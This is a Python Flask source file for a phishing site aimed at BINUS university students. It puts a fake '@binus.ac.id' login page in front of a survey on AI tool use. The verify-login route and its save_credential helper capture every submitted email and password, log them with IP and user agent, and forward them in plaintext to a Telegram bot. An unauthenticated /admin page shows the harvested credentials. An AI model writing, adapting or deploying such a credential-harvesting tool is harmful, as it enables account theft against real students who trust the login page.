from flask import Flask, request, render_template, redirect, session, jsonify
import json
import os
from datetime import datetime
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# Data storage files
CREDENTIALS_FILE = 'data/credentials.json'
SURVEY_FILE = 'data/survey_responses.json'

# Create data directory
os.makedirs('data', exist_ok=True)

def save_credential(email, password):
    """Save captured credentials"""
    data = {
        'email': email,
        'password': password,
        'timestamp': datetime.now().isoformat(),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'Unknown')
    }
    
    with open(CREDENTIALS_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(data, ensure_ascii=False) + '\n')
    
    # Send Telegram alert (if configured)
    send_telegram_alert(f"🎯 NEW LOGIN\n\nEmail: {email}\nPassword: {password}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    return data

def save_survey_response(data):
    """Save survey responses"""
    with open(SURVEY_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(data, ensure_ascii=False) + '\n')
    
    # Send summary to Telegram
    send_telegram_alert(f"📊 SURVEY COMPLETED\n\nEmail: {data['email']}\nJurusan: {data.get('jurusan', 'N/A')}\nAngkatan: {data.get('angkatan', 'N/A')}")

def send_telegram_alert(message):
    """Send alert to Telegram bot (optional)"""
    try:
        import requests
        # Replace with your bot token and chat ID
        TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
        TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')
        
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                json={"chat_id": TELEGRAM_CHAT_ID, "text": message},
                timeout=5
            )
    except Exception as e:
        print(f"Telegram alert failed: {e}")

@app.route('/')
def index():
    """Landing page with login gate"""
    ref = request.args.get('ref', 'direct')
    session['referrer'] = ref
    return render_template('login.html')

@app.route('/verify-login', methods=['POST'])
def verify_login():
    """Process login and capture credentials"""
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()
    
    # Validate BINUS email
    if not email.endswith('@binus.ac.id'):
        return render_template('login.html', error='Gunakan email BINUS (@binus.ac.id)')
    
    if not password:
        return render_template('login.html', error='Password tidak boleh kosong')
    
    # Save credentials
    save_credential(email, password)
    
    # Set session
    session['email'] = email
    session['verified'] = True
    
    # Redirect to survey
    return redirect('/survey')

@app.route('/survey')
def survey():
    """Survey form page"""
    if not session.get('verified'):
        return redirect('/')
    
    return render_template('survey.html', email=session.get('email'))

@app.route('/submit-survey', methods=['POST'])
def submit_survey():
    """Process survey submission"""
    if not session.get('verified'):
        return redirect('/')
    
    # Collect all form data
    response_data = {
        'email': session['email'],
        'timestamp': datetime.now().isoformat(),
        'referrer': session.get('referrer', 'direct'),
        'jurusan': request.form.get('jurusan'),
        'jurusan_lainnya': request.form.get('jurusan_lainnya', ''),
        'angkatan': request.form.get('angkatan'),
        'ipk': request.form.get('ipk'),
        'pernah_pakai_ai': request.form.get('pernah_pakai_ai'),
        'ai_tools': request.form.getlist('ai_tools'),
        'ai_tools_lainnya': request.form.get('ai_tools_lainnya', ''),
        'frekuensi': request.form.get('frekuensi'),
        'keperluan': request.form.getlist('keperluan'),
        'keperluan_lainnya': request.form.get('keperluan_lainnya', ''),
        'dampak': request.form.get('dampak'),
        'hemat_waktu': request.form.get('hemat_waktu'),
        'ketergantungan': request.form.get('ketergantungan')
    }
    
    # Save survey response
    save_survey_response(response_data)
    
    # Clear session
    session.clear()
    
    return render_template('thankyou.html')

@app.route('/admin')
def admin():
    """Admin dashboard to view collected data"""
    # Read credentials
    credentials = []
    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                try:
                    credentials.append(json.loads(line.strip()))
                except:
                    pass
    
    # Read survey responses
    responses = []
    if os.path.exists(SURVEY_FILE):
        with open(SURVEY_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                try:
                    responses.append(json.loads(line.strip()))
                except:
                    pass
    
    return render_template('admin.html', 
                         credentials=credentials[::-1],  # Reverse to show latest first
                         responses=responses[::-1],
                         total_creds=len(credentials),
                         total_responses=len(responses),
                         completion_rate=round(len(responses)/len(credentials)*100, 1) if credentials else 0)

@app.route('/api/stats')
def api_stats():
    """API endpoint for stats (for external monitoring)"""
    credentials_count = 0
    responses_count = 0
    
    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, 'r') as f:
            credentials_count = sum(1 for _ in f)
    
    if os.path.exists(SURVEY_FILE):
        with open(SURVEY_FILE, 'r') as f:
            responses_count = sum(1 for _ in f)
    
    return jsonify({
        'total_logins': credentials_count,
        'total_surveys': responses_count,
        'completion_rate': round(responses_count/credentials_count*100, 1) if credentials_count else 0
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
